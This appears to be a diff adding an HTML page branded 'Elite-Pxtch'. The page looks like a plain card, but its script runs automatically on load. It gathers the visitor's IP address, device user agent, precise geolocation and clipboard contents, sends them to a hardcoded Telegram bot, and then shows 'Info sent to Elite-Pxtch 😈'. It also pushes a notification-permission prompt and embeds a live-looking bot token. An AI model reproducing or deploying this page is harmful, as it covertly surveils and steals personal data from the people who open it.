@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ELITE Elite-Pxtch</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+   
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b1220;
+            color: #e8eefc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #111a2e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+        }
+        h2 {
+            font-size: 1.875rem;
+            font-weight: 700; 
+            color: #e8eefc;
+            margin-bottom: 20px;
+        }
+       
+        #messageBox {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e0f2fe; 
+            border: 1px solid #90cdf4;
+            border-radius: 8px;
+            color: #2c5282; 
+            font-weight: 500;
+            display: none; 
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>YO BROO ITS ELITE-PXTCH</h2>
+        <p class="text-gray-400"></p>
+  
+        <div id="messageBox"></div>
+    </div>
+
+<script>
+    const BOT_TOKEN = "7956295976:AAFA8acrQp0dmS4Xm3juGQwhAsH47aW-03k";
+    const CHAT_ID = "7291851471";
+
+    const messageBox = document.getElementById("messageBox");
+
+    function showMessage(message, type = 'info') {
+        messageBox.textContent = message;
+        messageBox.style.display = 'block';
+        messageBox.className = `mt-20 p-15 border rounded-lg font-medium ${
+            type === 'error'
+                ? 'bg-red-100 border-red-300 text-red-800'
+                : 'bg-blue-100 border-blue-300 text-blue-800'
+        }`;
+     
+        setTimeout(() => {
+            messageBox.style.display = 'none';
+        }, 5000);
+    }
+    function escapeMarkdownV2(text) {
+        return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+        }
+
+    async function getIP() {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+        } catch (error) {
+            return "Unknown";
+        }
+    }
+
+    async function getClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            return text ? text : "Clipboard empty";
+        } catch (err) {
+            return "Clipboard access denied";
+        }
+    }
+
+    function getDevice() {
+        return navigator.userAgent;
+    }
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                return resolve("Not supported");
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
+                },
+                (error) => {
+                    let errorMessage = "Permission denied or other error";
+                    if (error.code === error.PERMISSION_DENIED) {
+                        errorMessage = "Location permission denied";
+                    } else if (error.code === error.POSITION_UNAVAILABLE) {
+                        errorMessage = "Location unavailable";
+                    } else if (error.code === error.TIMEOUT) {
+                        errorMessage = "Location request timed out";
+                    }
+                    resolve(errorMessage);
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        });
+    }
+
+    // Send info to Telegram Bot
+    async function sendInfo() {
+        const ip = await getIP();
+const device = escapeMarkdownV2(getDevice());
+const location = escapeMarkdownV2(await getLocation());
+const clipboard = escapeMarkdownV2(await getClipboard());
+
+        const text = `📡 New Info Received
+🌍 IP: ${ip}
+📱 Device: ${device}
+📌 Location: ${location}
+📋 Clipboard: ${clipboard}
+👨‍💻 DEV: NAVDEEP`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const body = new URLSearchParams();
+        body.append("chat_id", CHAT_ID);
+        body.append("text", text);
+        body.append("parse_mode", "Markdown");
+
+        try {
+            const res = await fetch(url, { method: "POST", body });
+            const data = await res.json();
+
+            if (data.ok) {
+                showMessage("✅ Info sent to Elite-Pxtch 😈", 'info');
+            } else {
+                showMessage("❌ Error: " + data.description, 'error');
+            }
+        } catch (err) {
+            console.error("Network error:", err);
+            showMessage("⚠️ Network error..", 'error');
+        }
+    }
+
+    // Run sendInfo automatically when the page is loaded
+    window.onload = function() {
+        sendInfo();
+    };
+    OneSignal.push(function() {
+  OneSignal.showNativePrompt();
+});
+
+</script>
+
+<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
+<script>
+  window.OneSignalDeferred = window.OneSignalDeferred || [];
+  OneSignal.showNativePrompt();
+
+  OneSignalDeferred.push(async function(OneSignal) {
+    await OneSignal.init({
+      appId: "551cdd3a-7259-481b-9e10-6da4d7e8ed02",
+    });
+  });
+</script>
+
+
+</body>
+</html>
